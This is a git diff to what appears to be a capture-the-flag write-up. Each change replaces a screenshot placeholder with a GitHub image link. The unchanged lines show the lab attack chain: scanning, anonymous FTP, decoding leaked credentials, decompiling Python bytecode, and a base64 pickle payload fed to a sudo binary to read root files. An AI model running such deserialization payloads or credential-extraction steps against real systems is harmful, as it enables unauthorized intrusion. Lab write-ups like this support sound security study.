@@ -14,7 +14,7 @@
 nmap -sV <TARGET_IP>
 ```
 
-[SCREEN01]
+<img width="724" height="218" alt="SCREEN01" src="https://github.com/user-attachments/assets/df9a0d09-4194-4cc1-9bf8-c9b981152a1d" />
 
 2. Connect to the identified FTP service using anonymous credentials to enumerate accessible files
 
@@ -38,7 +38,7 @@ with open("download.dat", "rb") as file:
     print(creds)
 ```
 
-[SCREEN02]
+<img width="722" height="180" alt="SCREEN02" src="https://github.com/user-attachments/assets/447dbef8-15c7-4ca6-9533-8c08dc113b9e" />
 
 5. Establish SSH connection using the obtained credentials to gain initial system access
 
@@ -54,7 +54,7 @@ sudo pip3 install uncompyle6
 uncompyle6 cmd_service.pyc
 ```
 
-[SCREEN03]
+<img width="719" height="250" alt="SCREEN03" src="https://github.com/user-attachments/assets/019d1566-c019-4224-8dde-bc8b20cd4894" />
 
 7. Analyze the decompiled code to identify encoded numerical values representing authentication credentials. Apply cryptographic conversion to decode the values
    - The decoded credentials are: `dill:n3v3r_@_d1ll_m0m3nt`
@@ -72,7 +72,7 @@ print(f"Username: {username}")
 print(f"Password: {password}")
 ```
 
-[SCREEN04]
+<img width="721" height="52" alt="SCREEN04" src="https://github.com/user-attachments/assets/4329b4d4-1fb1-4568-b752-b4c556770c61" />
 
 8. Connect to the identified network service using the decoded credentials and locate the user flag
 
@@ -81,7 +81,7 @@ nc <TARGET_IP> 7321
 cat /home/dill/user.txt
 ```
 
-[SCREEN05]
+<img width="721" height="159" alt="SCREEN05" src="https://github.com/user-attachments/assets/5a07d29c-c11c-403a-bc6a-7d1d4a5b5cdd" />
 
 ---
 
@@ -116,4 +116,4 @@ print(base64.b64encode(pickle_data))
 echo "gASVJgAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAtjYXQgL3Jvb3QvKpSFlFKULg==" | sudo /opt/peak_hill_farm/peak_hill_farm
 ```
 
-[SCREEN07]
+<img width="721" height="129" alt="SCREEN07" src="https://github.com/user-attachments/assets/7f245c4f-1c85-4450-b8a6-50488b0bc0ba" />
